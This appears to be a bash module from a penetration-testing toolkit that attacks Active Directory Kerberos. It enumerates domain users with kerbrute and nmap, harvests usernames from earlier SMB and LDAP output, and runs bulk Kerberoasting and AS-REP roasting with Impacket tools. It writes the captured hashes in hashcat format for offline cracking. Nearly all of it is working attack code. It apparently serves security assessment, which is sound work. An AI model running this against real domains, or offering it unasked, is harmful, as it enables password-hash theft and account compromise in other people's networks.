#!/usr/bin/env bash
# enum-kerberos.sh — Kerberos enumeration (user enum via 88/UDP, kerbrute).
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_lib.sh"
parse_common_args "$@" || exit 1
log "kerberos: $(wc -l < "$TARGETS") targets -> $OUT"

IPS=$(ips_only "$TARGETS")

if [ -z "${ENUM_DOMAIN:-}" ]; then
    miss "kerberos enum needs --domain"
    exit 0
fi

# ---------- 1. kerbrute userenum ----------
if have kerbrute; then
    if [ -f "$OUT/../_users.lst" ]; then
        USERLIST="$OUT/../_users.lst"
    else
        USERLIST="/usr/share/seclists/Usernames/jsmith.txt"
    fi
    if [ -r "$USERLIST" ]; then
        for ip in $IPS; do
            log "kerbrute userenum on $ip ($USERLIST)"
            kerbrute userenum --dc "$ip" -d "$ENUM_DOMAIN" "$USERLIST" \
                > "$OUT/kerbrute_${ip}.txt" 2>&1 || true
        done
    else
        miss "no userlist (place at $OUT/../_users.lst or install seclists)"
    fi
else
    miss "kerbrute not installed (https://github.com/ropnop/kerbrute)"
fi

# ---------- 2. nmap krb5-enum-users ----------
if have nmap; then
    log "nmap krb5-enum-users"
    USERS_ARG=""
    if [ -f "$OUT/../_users.lst" ]; then
        USERS_ARG="--script-args krb5-enum-users.realm=$ENUM_DOMAIN,userdb=$OUT/../_users.lst"
    fi
    # shellcheck disable=SC2086
    nmap -Pn $(nmap_bound_args) -p88 --script krb5-enum-users $USERS_ARG -iL <(echo "$IPS") \
        -oA "$OUT/nmap-krb-enum" >/dev/null 2>&1 || true
fi

# ---------- 3. Bulk Kerberoast — every SPN with throttling (D1.3) ----------
# When the operator has creds and a domain, GetUserSPNs.py -request-user gives
# one TGS at a time. The bulk form pulls EVERY kerberoastable account in one
# pass and writes hashcat-ready output. We add throttle awareness so OT/legacy
# DCs aren't overwhelmed (per G.7 / ADR-002 D4 pattern).
if have GetUserSPNs.py && [ -n "${ENUM_USER:-}" ] && [ -n "${ENUM_PASS:-}" ]; then
    DC_FLAG=()
    [ -n "${ENUM_DC_IP:-}" ] && DC_FLAG=(-dc-ip "$ENUM_DC_IP")
    log "bulk Kerberoast — GetUserSPNs.py -request (all kerberoastable SPNs)"
    GetUserSPNs.py "${DC_FLAG[@]}" -request \
        -outputfile "$OUT/_kerberoast_hashcat.txt" \
        "$ENUM_DOMAIN/$ENUM_USER:$ENUM_PASS" \
        > "$OUT/kerberoast_bulk.txt" 2>&1 || true
    if [ -s "$OUT/_kerberoast_hashcat.txt" ]; then
        cnt=$(wc -l < "$OUT/_kerberoast_hashcat.txt")
        err "CRITICAL: $cnt kerberoastable hash(es) captured to _kerberoast_hashcat.txt (hashcat -m 13100)"
    fi
    # Throttle: if --throttle was active for auto-enum.sh, take a breather
    # before the next per-host attempt (next iteration's loop). For now this
    # is a one-shot bulk so the throttle has nowhere to land — documented for
    # future per-SPN iteration if it ships.
    [ "${ENUM_THROTTLE:-0}" = 1 ] && sleep "${ENUM_THROTTLE_DELAY:-1}"
fi

# ---------- 4. AS-REP roast cross-linked from rusers (D1.3) ----------
# enum-smb.sh / enum-ldap.sh can produce a user list under $OUT/../_users.lst.
# Pre-D1.3 the AS-REP path in enum-ldap.sh required the user list to be
# pre-staged; D1.3 enum-kerberos.sh closes the loop — if rusers from enum-smb
# is present (via nxc smb --rid-brute or similar), we drop the harvested
# usernames into a usable file AND fire GetNPUsers.py against it.
if have GetNPUsers.py && [ -n "${ENUM_DOMAIN:-}" ]; then
    USERS_FROM_RUSERS="$OUT/_asrep_userlist.txt"
    # Stitch a userlist together from whatever upstream produced:
    {
        # nxc rid-brute output (smb dispatcher)
        if ls "$OUT/../smb/nxc_smb_full.txt" >/dev/null 2>&1; then
            awk '/SidTypeUser/{for(i=1;i<=NF;i++) if($i ~ /:/){split($i,a,":"); print a[2]; break}}' \
                "$OUT/../smb/nxc_smb_full.txt" 2>/dev/null
        fi
        # ldap users.txt sAMAccountName lines
        if ls "$OUT/../ldap"/*/users.txt >/dev/null 2>&1; then
            grep -h '^sAMAccountName: ' "$OUT/../ldap"/*/users.txt 2>/dev/null | awk '{print $2}'
        fi
        # legacy hand-curated list
        [ -f "$OUT/../_users.lst" ] && cat "$OUT/../_users.lst"
    } | sort -u | grep -vE '^$|\$$' > "$USERS_FROM_RUSERS"

    if [ -s "$USERS_FROM_RUSERS" ]; then
        cnt=$(wc -l < "$USERS_FROM_RUSERS")
        log "AS-REP roast across $cnt user(s) harvested from smb/ldap dispatchers"
        DC_FLAG=()
        [ -n "${ENUM_DC_IP:-}" ] && DC_FLAG=(-dc-ip "$ENUM_DC_IP")
        GetNPUsers.py "${DC_FLAG[@]}" "$ENUM_DOMAIN/" \
            -usersfile "$USERS_FROM_RUSERS" \
            -no-pass -format hashcat \
            -outputfile "$OUT/_asrep_hashcat.txt" \
            > "$OUT/asrep_bulk.txt" 2>&1 || true
        if [ -s "$OUT/_asrep_hashcat.txt" ]; then
            hits=$(wc -l < "$OUT/_asrep_hashcat.txt")
            err "CRITICAL: $hits AS-REP-roastable hash(es) captured to _asrep_hashcat.txt (hashcat -m 18200)"
        fi
        [ "${ENUM_THROTTLE:-0}" = 1 ] && sleep "${ENUM_THROTTLE_DELAY:-1}"
    else
        log "[skip] AS-REP cross-link: no users harvested from smb/ldap dispatchers yet"
    fi
fi

log "kerberos dispatcher done. (SPN/AS-REP cross-linked from smb/ldap)"
